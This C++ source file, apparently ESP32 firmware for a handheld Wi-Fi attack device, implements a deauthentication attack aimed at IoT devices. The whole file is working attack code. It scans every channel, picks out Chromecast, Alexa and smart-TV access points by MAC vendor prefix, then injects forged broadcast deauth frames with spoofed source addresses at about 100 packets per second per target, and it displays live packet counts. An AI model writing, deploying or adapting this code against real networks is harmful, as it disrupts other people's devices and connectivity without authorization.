#include "iot_deauth.h"
#include "core/display.h"
#include "wifi_atks.h"

#define MAX_IOT_DEVICES 16

static IoTDevice _devices[MAX_IOT_DEVICES];
static int _device_count = 0;
static bool _is_active = false;
static uint32_t _total_packets = 0;
static unsigned long _last_update = 0;
static IoTTarget _current_target = IOT_TARGET_ALL;

void iot_deauth_init() {
    _device_count = 0;
    _is_active = false;
    _total_packets = 0;
    memset(_devices, 0, sizeof(_devices));
}

// Verifica se MAC pertence a um tipo de dispositivo IoT
static bool match_oui(const uint8_t* mac, IoTTarget type) {
    const uint8_t (*ouis)[3] = nullptr;
    int count = 0;

    switch (type) {
        case IOT_TARGET_CHROMECAST:
            ouis = OUI_CHROMECAST;
            count = sizeof(OUI_CHROMECAST) / 3;
            break;
        case IOT_TARGET_ALEXA:
            ouis = OUI_ALEXA;
            count = sizeof(OUI_ALEXA) / 3;
            break;
        case IOT_TARGET_SMARTTV:
            ouis = OUI_SMARTTV;
            count = sizeof(OUI_SMARTTV) / 3;
            break;
        case IOT_TARGET_ALL:
            // Verifica todos
            if (match_oui(mac, IOT_TARGET_CHROMECAST)) return true;
            if (match_oui(mac, IOT_TARGET_ALEXA)) return true;
            if (match_oui(mac, IOT_TARGET_SMARTTV)) return true;
            return false;
    }

    for (int i = 0; i < count; i++) {
        if (memcmp(mac, ouis[i], 3) == 0) return true;
    }
    return false;
}

int iot_deauth_scan(IoTTarget type) {
    _current_target = type;
    _device_count = 0;

    displayInfo("Escaneando IoT...", false);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Desabilita filtro para modo promíscuo
    esp_wifi_set_promiscuous(true);

    // Escaneia em todos os canais
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        int n = WiFi.scanNetworks(false, true, false, 200, ch);

        for (int i = 0; i < n && _device_count < MAX_IOT_DEVICES; i++) {
            uint8_t* bssid = WiFi.BSSID(i);

            // Verifica se o AP ou clientes são IoT
            if (match_oui(bssid, type) || type == IOT_TARGET_ALL) {
                IoTDevice dev;
                memcpy(dev.bssid, bssid, 6);
                memset(dev.client_mac, 0xFF, 6);  // Broadcast
                dev.channel = ch;
                dev.rssi = WiFi.RSSI(i);
                dev.is_active = true;
                dev.packets_sent = 0;

                // Determina tipo
                if (match_oui(bssid, IOT_TARGET_CHROMECAST)) dev.type = IOT_TARGET_CHROMECAST;
                else if (match_oui(bssid, IOT_TARGET_ALEXA)) dev.type = IOT_TARGET_ALEXA;
                else if (match_oui(bssid, IOT_TARGET_SMARTTV)) dev.type = IOT_TARGET_SMARTTV;
                else dev.type = IOT_TARGET_ALL;

                _devices[_device_count++] = dev;
            }
        }

        WiFi.scanDelete();
    }

    esp_wifi_set_promiscuous(false);

    String msg = String(_device_count) + " dispositivos\nIoT encontrados!";
    displayInfo(msg, true);

    return _device_count;
}

bool iot_deauth_start() {
    if (_device_count == 0) {
        displayWarning("Nenhum dispositivo!\nFaca scan primeiro.", true);
        return false;
    }

    _is_active = true;
    _total_packets = 0;

    displayInfo("Deauth IoT iniciado!", false);
    return true;
}

void iot_deauth_stop() {
    _is_active = false;
    esp_wifi_set_promiscuous(false);

    String msg = "Deauth parado\n" + String(_total_packets) + " pacotes";
    displaySuccess(msg, true);
}

int iot_deauth_update() {
    if (!_is_active) return 0;

    unsigned long now = millis();
    if (now - _last_update < 10) return 0;  // 100 pps por dispositivo
    _last_update = now;

    int sent = 0;

    for (int i = 0; i < _device_count; i++) {
        if (!_devices[i].is_active) continue;

        // Muda para o canal do dispositivo
        esp_wifi_set_channel(_devices[i].channel, WIFI_SECOND_CHAN_NONE);

        // Envia pacotes deauth usando a função existente do wifi_atks
        // Frame deauth: tipo=0xC0, subtipo=0x00
        uint8_t deauth_frame[26] = {
            0xC0, 0x00,                         // Frame Control (deauth)
            0x00, 0x00,                         // Duration
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
            0x00, 0x00,                         // Sequence
            0x07, 0x00                          // Reason: Class 3 frame
        };

        // Preenche MACs
        memcpy(&deauth_frame[10], _devices[i].bssid, 6);
        memcpy(&deauth_frame[16], _devices[i].bssid, 6);

        // Envia via raw injection
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);

        _devices[i].packets_sent++;
        _total_packets++;
        sent++;
    }

    // Atualiza display periodicamente
    static unsigned long last_display = 0;
    if (now - last_display > 500) {
        last_display = now;
        tft.fillRect(0, tftHeight - 20, tftWidth, 20, leleConfig.bgColor);
        tft.setCursor(10, tftHeight - 15);
        tft.printf("Deauth: %d pkts | %d alvos", _total_packets, _device_count);
    }

    return sent;
}

bool iot_deauth_is_active() { return _is_active; }
uint32_t iot_deauth_get_packets() { return _total_packets; }
int iot_deauth_get_device_count() { return _device_count; }
IoTDevice* iot_deauth_get_devices() { return _devices; }
